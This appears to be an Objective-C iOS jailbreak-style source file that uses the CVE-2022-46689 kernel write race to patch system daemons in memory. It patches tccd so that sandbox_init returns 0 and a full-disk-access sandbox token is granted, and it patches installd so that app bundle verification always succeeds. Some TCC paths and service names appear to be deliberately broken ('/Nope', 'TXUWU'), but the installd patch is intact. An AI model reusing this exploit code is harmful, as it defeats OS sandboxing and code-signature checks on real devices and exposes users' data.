#ifdef MDC
@import Darwin;
@import Foundation;
@import MachO;

#import <mach-o/fixup-chains.h>
// you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
// WDBFontOverwrite
// Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
// Please don't call this code on iOS 14 or below
// (This temporarily overwrites tccd, and on iOS 14 and above changes do not revert on reboot)
#import "grant_fda.h"
#import "helping_tools.h"
#import "vm_unalign_csr.h"

typedef NSObject* xpc_object_t;
typedef xpc_object_t xpc_connection_t;
typedef void (^xpc_handler_t)(xpc_object_t object);
xpc_object_t xpc_dictionary_create(const char* const _Nonnull* keys,
                                   xpc_object_t _Nullable const* values, size_t count);
xpc_connection_t xpc_connection_create_mach_service(const char* name, dispatch_queue_t targetq,
                                                    uint64_t flags);
void xpc_connection_set_event_handler(xpc_connection_t connection, xpc_handler_t handler);
void xpc_connection_resume(xpc_connection_t connection);
void xpc_connection_send_message_with_reply(xpc_connection_t connection, xpc_object_t message,
                                            dispatch_queue_t replyq, xpc_handler_t handler);
xpc_object_t xpc_connection_send_message_with_reply_sync(xpc_connection_t connection,
                                                         xpc_object_t message);
xpc_object_t xpc_bool_create(bool value);
xpc_object_t xpc_string_create(const char* string);
xpc_object_t xpc_null_create(void);
const char* xpc_dictionary_get_string(xpc_object_t xdict, const char* key);

int64_t sandbox_extension_consume(const char* token);

// MARK: - patchfind

struct fda_offsets {
  uint64_t of_addr_com_apple_tcc_;
  uint64_t offset_pad_space_for_rw_string;
  uint64_t of_addr_s_kTCCSML;
  uint64_t of_auth_got_sb_init;
  uint64_t of_return_0;
  bool is_arm64e;
};

static bool pchfind_sections(void* execmap,
                               struct segment_command_64** data_seg,
                               struct symtab_command** stabout,
                               struct dysymtab_command** dystabout) {
  struct mach_header_64* executable_header = execmap;
  struct load_command* load_command = execmap + sizeof(struct mach_header_64);
  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
       load_command_index++) {
    switch (load_command->cmd) {
      case LC_SEGMENT_64: {
        struct segment_command_64* segment = (struct segment_command_64*)load_command;
        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
          *data_seg = segment;
        }
        break;
      }
      case LC_SYMTAB: {
        *stabout = (struct symtab_command*)load_command;
        break;
      }
      case LC_DYSYMTAB: {
        *dystabout = (struct dysymtab_command*)load_command;
        break;
      }
    }
    load_command = ((void*)load_command) + load_command->cmdsize;
  }
  return true;
}

static uint64_t pchfind_get_padding(struct segment_command_64* segment) {
  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
  struct section_64* last_section = &section_array[segment->nsects - 1];
  return last_section->offset + last_section->size;
}

static uint64_t pchfind_pointer_to_string(void* em, size_t el, const char* n) {
  void* str_offset = memmem(em, el, n, strlen(n) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - em;
  for (int i = 0; i < el; i += 8) {
    uint64_t val = *(uint64_t*)(em + i);
    if ((val & 0xfffffffful) == str_file_offset) {
      return i;
    }
  }
  return 0;
}

static uint64_t pchfind_return_0(void* exmp, size_t el) {
  // TCCDSyncAccessAction::sequencer
  // mov x0, #0
  // ret
  static const char ndle[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(exmp, el, ndle, sizeof(ndle));
  if (!offset) {
    return 0;
  }
  return offset - exmp;
}

static uint64_t pchfind_got(void* ecm, size_t executable_length,
                              struct segment_command_64* data_const_segment,
                              struct symtab_command* symtab_command,
                              struct dysymtab_command* dysymtab_command,
                              const char* target_symbol_name) {
  uint64_t target_symbol_index = 0;
  for (int sym_index = 0; sym_index < symtab_command->nsyms; sym_index++) {
    struct nlist_64* sym =
        ((struct nlist_64*)(ecm + symtab_command->symoff)) + sym_index;
    const char* sym_name = ecm + symtab_command->stroff + sym->n_un.n_strx;
    if (strcmp(sym_name, target_symbol_name)) {
      continue;
    }
    // printf("%d %llx\n", sym_index, (uint64_t)(((void*)sym) - execmap));
    target_symbol_index = sym_index;
    break;
  }

  struct section_64* section_array =
      ((void*)data_const_segment) + sizeof(struct segment_command_64);
  struct section_64* first_section = &section_array[0];
  if (!(strcmp(first_section->sectname, "__auth_got") == 0 ||
        strcmp(first_section->sectname, "__got") == 0)) {
    return 0;
  }
  uint32_t* indirect_table = ecm + dysymtab_command->indirectsymoff;

  for (int i = 0; i < first_section->size; i += 8) {
    uint64_t val = *(uint64_t*)(ecm + first_section->offset + i);
    uint64_t indirect_table_entry = (val & 0xfffful);
    if (indirect_table[first_section->reserved1 + indirect_table_entry] == target_symbol_index) {
      return first_section->offset + i;
    }
  }
  return 0;
}

static bool pchfind(void* execmap, size_t executable_length,
                      struct fda_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!pchfind_sections(execmap, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
//    printf("no sections\n");
    return false;
  }
  if ((offsets->of_addr_com_apple_tcc_ =
           pchfind_pointer_to_string(execmap, executable_length, "com.apple.tcc.")) == 0) {
//    printf("no com.apple.tcc. string\n");
    return false;
  }
  if ((offsets->offset_pad_space_for_rw_string =
           pchfind_get_padding(data_const_segment)) == 0) {
//    printf("no padding\n");
    return false;
  }
  if ((offsets->of_addr_s_kTCCSML = pchfind_pointer_to_string(
           execmap, executable_length, "kTCCServiceMediaLibrary")) == 0) {
//    printf("no kTCCServiceMediaLibrary string\n");
    return false;
  }
  if ((offsets->of_auth_got_sb_init =
           pchfind_got(execmap, executable_length, data_const_segment, symtab_command,
                         dysymtab_command, "_sandbox_init")) == 0) {
//    printf("no sandbox_init\n");
    return false;
  }
  if ((offsets->of_return_0 = pchfind_return_0(execmap, executable_length)) ==
      0) {
//    printf("no just return 0\n");
    return false;
  }
  struct mach_header_64* executable_header = execmap;
  offsets->is_arm64e = (executable_header->cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;

  return true;
}

// MARK: - tccd patching

static void call_tcc_daemon(void (^completion)(NSString* _Nullable extension_token)) {
  // reimplmentation of TCCAccessRequest, as we need to grab and cache the sandbox token so we can
  // re-use it until next reboot.
  // Returns the sandbox token if there is one, or nil if there isn't one.
    //TODO WARNING REPLACE com.apple.tccd
  xpc_connection_t connection = xpc_connection_create_mach_service(
      "TXUWU", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
  xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
//    NSLog(@"event handler (xpc): %@", object);
  });
    xpc_connection_resume(connection);
  const char* keys[] = {
//      "TCCD_MSG_ID",  "function",           "service", "require_purpose", "preflight",
//      "target_token", "background_session",
  };
  xpc_object_t values[] = {
      xpc_string_create("17087.1"),
      xpc_string_create("TCCAccessRequest"),
      xpc_string_create("com.apple.app-sandbox.read-write"),
      xpc_null_create(),
      xpc_bool_create(false),
      xpc_null_create(),
      xpc_bool_create(false),
  };
  xpc_object_t request_message = xpc_dictionary_create(keys, values, sizeof(keys) / sizeof(*keys));
#if 0
  xpc_object_t response_message = xpc_connection_send_message_with_reply_sync(connection, request_message);
//  NSLog(@"%@", response_message);

#endif
  xpc_connection_send_message_with_reply(
      connection, request_message, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
      ^(xpc_object_t object) {
        if (!object) {
            //object is nil???
//          NSLog(@"wqfewfw9");
          completion(nil);
          return;
        }
          //response:
//        NSLog(@"qwdqwd%@", object);
        if ([object isKindOfClass:NSClassFromString(@"OS_xpc_error")]) {
//          NSLog(@"xpc error?");
          completion(nil);
          return;
        }
          //debug description:
//        NSLog(@"wqdwqu %@", [object debugDescription]);
        const char* extension_string = xpc_dictionary_get_string(object, "extension");
        NSString* extension_nsstring =
            extension_string ? [NSString stringWithUTF8String:extension_string] : nil;
        completion(extension_nsstring);
      });
}

static NSData* patch_tcc_daemon(void* executableMap, size_t executableLength) {
  struct fda_offsets offsets = {};
  if (!pchfind(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  // strcpy(data.mutableBytes, "com.apple.app-sandbox.read-write", sizeOfStr);
  char* mutableBytes = data.mutableBytes;
  {
    // rewrite com.apple.tcc. into blank string
    *(uint64_t*)(mutableBytes + offsets.of_addr_com_apple_tcc_ + 8) = 0;
  }
  {
    // make of_addr_s_kTCCSML point to "com.apple.app-sandbox.read-write"
    // we need to stick this somewhere; just put it in the padding between
    // the end of __objc_arrayobj and the end of __DATA_CONST
    strcpy((char*)(data.mutableBytes + offsets.offset_pad_space_for_rw_string),
           "com.apple.app-sandbox.read-write");
    struct dyld_chained_ptr_arm64e_rebase tRBase =
        *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                                  offsets.of_addr_s_kTCCSML);
    tRBase.target = offsets.offset_pad_space_for_rw_string;
    *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                              offsets.of_addr_s_kTCCSML) =
        tRBase;
    *(uint64_t*)(mutableBytes + offsets.of_addr_s_kTCCSML + 8) =
        strlen("com.apple.app-sandbox.read-write");
  }
  if (offsets.is_arm64e) {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_arm64e_auth_rebase tRBase = {
        .auth = 1,
        .bind = 0,
        .next = 1,
        .key = 0,  // IA
        .addrDiv = 1,
        .diversity = 0,
        .target = offsets.of_return_0,
    };
    *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                   offsets.of_auth_got_sb_init) =
        tRBase;
  } else {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_64_rebase tRBase = {
        .bind = 0,
        .next = 2,
        .target = offsets.of_return_0,
    };
    *(struct dyld_chained_ptr_64_rebase*)(mutableBytes + offsets.of_auth_got_sb_init) =
        tRBase;
  }
  return data;
}

static bool over_write_file(int fd, NSData* sourceData) {
  for (int off = 0; off < sourceData.length; off += 0x4000) {
    bool success = false;
    for (int i = 0; i < 2; i++) {
      if (unalign_csr(
              fd, off, sourceData.bytes + off,
              off + 0x4000 > sourceData.length ? sourceData.length - off : 0x4000)) {
        success = true;
        break;
      }
    }
    if (!success) {
      return false;
    }
  }
  return true;
}

static void grant_fda_impl(void (^completion)(NSString* extension_token,
                                                           NSError* _Nullable error)) {
//  char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
      char* targetPath = "/Nope";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  if (fd == -1) {
    // iOS 15.3 and below
//    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
          targetPath = "/Nope";
    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  }
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = patch_tcc_daemon(targetMap, targetLength);
  if (!sourceData) {
    completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                        code:5
                                    userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
    return;
  }

  if (!over_write_file(fd, sourceData)) {
    over_write_file(fd, originalData);
    munmap(targetMap, targetLength);
    completion(
        nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                 code:1
                             userInfo:@{
                               NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
                                                           @"not be vulnerable to CVE-2022-46689."
                             }]);
    return;
  }
  munmap(targetMap, targetLength);

//  crash_with_xpc_thingy("com.apple.tccd");
    
  sleep(1);
  call_tcc_daemon(^(NSString* _Nullable extension_token) {
    over_write_file(fd, originalData);
//    crash_with_xpc_thingy("com.apple.tccd");
    NSError* returnError = nil;
    if (extension_token == nil) {
      returnError =
          [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                              code:2
                          userInfo:@{
                            NSLocalizedDescriptionKey : @"no extension token returned."
                          }];
    } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
      returnError = [NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:3
                 userInfo:@{
                   NSLocalizedDescriptionKey : @"failed: returned a media library token "
                                               @"instead of an app sandbox token."
                 }];
      extension_token = nil;
    }
    completion(extension_token, returnError);
  });
}

void grant_fda(void (^completion)(NSError* _Nullable)) {
  if (!NSClassFromString(@"NSPresentationIntent")) {
    // class introduced in iOS 15.0.
    // TODO(zhuowei): maybe check the actual OS version instead?
    completion([NSError
        errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                   code:6
               userInfo:@{
                 NSLocalizedDescriptionKey :
                     @"Not supported on iOS 14 and below."
               }]);
    return;
  }
  NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory
                                                                  inDomains:NSUserDomainMask][0];
  NSURL* sourceURL =
      [documentDirectory URLByAppendingPathComponent:@"fda_token.txt"];
  NSError* error = nil;
  NSString* cachedToken = [NSString stringWithContentsOfURL:sourceURL
                                                   encoding:NSUTF8StringEncoding
                                                      error:&error];
  if (cachedToken) {
    int64_t handle = sandbox_extension_consume(cachedToken.UTF8String);
    if (handle > 0) {
      // cached version worked
      completion(nil);
      return;
    }
  }
  grant_fda_impl(^(NSString* extension_token, NSError* _Nullable error) {
    if (error) {
      completion(error);
      return;
    }
    int64_t handle = sandbox_extension_consume(extension_token.UTF8String);
    if (handle <= 0) {
      completion([NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:4
                 userInfo:@{NSLocalizedDescriptionKey : @"Failed to consume generated extension"}]);
      return;
    }
    [extension_token writeToURL:sourceURL
                     atomically:true
                       encoding:NSUTF8StringEncoding
                          error:&error];
    completion(nil);
  });
}

// MARK: - installd patch

struct daemon_remove_app_limit_offsets {
  uint64_t offset_objc_method_list_t_MIInstallableBundle;
  uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
  uint64_t offset_data_const_end_padding;
  // MIUninstallRecord::supportsSecureCoding
  uint64_t offset_return_true;
};

struct daemon_remove_app_limit_offsets gAppLimitOffsets = {
    .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
    .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
    .offset_data_const_end_padding = 0x79c38,
    .offset_return_true = 0x19860,
};

static uint64_t pchfind_find_rwt_base_methods(void* execmap,
                                                      size_t executable_length,
                                                      const char* needle) {
  void* str_offset = memmem(execmap, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - execmap;
  for (int i = 0; i < executable_length - 8; i += 8) {
    uint64_t val = *(uint64_t*)(execmap + i);
    if ((val & 0xfffffffful) != str_file_offset) {
      continue;
    }
    // baseMethods
    if (*(uint64_t*)(execmap + i + 8) != 0) {
      return i + 8;
    }
  }
  return 0;
}

static uint64_t pchfind_returns_true(void* execmap, size_t executable_length) {
  // mov w0, #1
  // ret
  static const char needle[] = {0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(execmap, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - execmap;
}

static bool pchfind_deaaamon(void* execmap, size_t executable_length,
                               struct daemon_remove_app_limit_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!pchfind_sections(execmap, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
//    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_data_const_end_padding = pchfind_get_padding(data_const_segment)) == 0) {
//    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods =
           pchfind_find_rwt_base_methods(execmap, executable_length,
                                                 "MIInstallableBundle")) == 0) {
//    printf("no MIInstallableBundle class_rw_t\n");
    return false;
  }
  offsets->offset_objc_method_list_t_MIInstallableBundle =
      (*(uint64_t*)(execmap +
                    offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods)) &
      0xffffffull;

  if ((offsets->offset_return_true = pchfind_returns_true(execmap, executable_length)) ==
      0) {
//    printf("no return true\n");
    return false;
  }
  return true;
}

struct objc_method {
  int32_t name;
  int32_t types;
  int32_t imp;
};

struct objc_method_list {
  uint32_t entsizeAndFlags;
  uint32_t count;
  struct objc_method methods[];
};

static void patch_cpy_methods(void* mutableBytes, uint64_t old_offset,
                                        uint64_t new_offset, uint64_t* out_copied_length,
                                        void (^callback)(const char* sel,
                                                         uint64_t* inout_function_pointer)) {
  struct objc_method_list* original_list = mutableBytes + old_offset;
  struct objc_method_list* new_list = mutableBytes + new_offset;
  *out_copied_length =
      sizeof(struct objc_method_list) + original_list->count * sizeof(struct objc_method);
  new_list->entsizeAndFlags = original_list->entsizeAndFlags;
  new_list->count = original_list->count;
  for (int method_index = 0; method_index < original_list->count; method_index++) {
    struct objc_method* method = &original_list->methods[method_index];
    // Relative pointers
    uint64_t name_file_offset = ((uint64_t)(&method->name)) - (uint64_t)mutableBytes + method->name;
    uint64_t types_file_offset =
        ((uint64_t)(&method->types)) - (uint64_t)mutableBytes + method->types;
    uint64_t imp_file_offset = ((uint64_t)(&method->imp)) - (uint64_t)mutableBytes + method->imp;
    const char* sel = mutableBytes + (*(uint64_t*)(mutableBytes + name_file_offset) & 0xffffffull);
    callback(sel, &imp_file_offset);

    struct objc_method* new_method = &new_list->methods[method_index];
    new_method->name = (int32_t)((int64_t)name_file_offset -
                                 (int64_t)((uint64_t)&new_method->name - (uint64_t)mutableBytes));
    new_method->types = (int32_t)((int64_t)types_file_offset -
                                  (int64_t)((uint64_t)&new_method->types - (uint64_t)mutableBytes));
    new_method->imp = (int32_t)((int64_t)imp_file_offset -
                                (int64_t)((uint64_t)&new_method->imp - (uint64_t)mutableBytes));
  }
};

static NSData* make_installdaemon_patch(void* executableMap, size_t executableLength) {
  struct daemon_remove_app_limit_offsets offsets = {};
  if (!pchfind_deaaamon(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  char* mutableBytes = data.mutableBytes;
  uint64_t current_empty_space = offsets.offset_data_const_end_padding;
  uint64_t copied_size = 0;
  uint64_t new_method_list_offset = current_empty_space;
  patch_cpy_methods(mutableBytes, offsets.offset_objc_method_list_t_MIInstallableBundle,
                              current_empty_space, &copied_size,
                              ^(const char* sel, uint64_t* inout_address) {
                                if (strcmp(sel, "performVerificationWithError:") != 0) {
                                  return;
                                }
                                *inout_address = offsets.offset_return_true;
                              });
  current_empty_space += copied_size;
  ((struct
    dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                          offsets
                                              .offset_objc_class_rw_t_MIInstallableBundle_baseMethods))
      ->target = new_method_list_offset;
  return data;
}

bool installdaemon_patch() {
  const char* targetPath = "/usr/libexec/installd";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = make_installdaemon_patch(targetMap, targetLength);
  if (!sourceData) {
      //can't patchfind
//    NSLog(@"wuiydqw98uuqwd");
    return false;
  }

  if (!over_write_file(fd, sourceData)) {
    over_write_file(fd, originalData);
    munmap(targetMap, targetLength);
      //can't overwrite
//    NSLog(@"wfqiohuwdhuiqoji");
    return false;
  }
  munmap(targetMap, targetLength);
  crash_with_xpc_thingy("com.apple.mobile.installd");
  sleep(1);

  // TODO(zhuowei): for now we revert it once installd starts
  // so the change will only last until when this installd exits
//  over_write_file(fd, originalData);
  return true;
}
#endif /* MDC */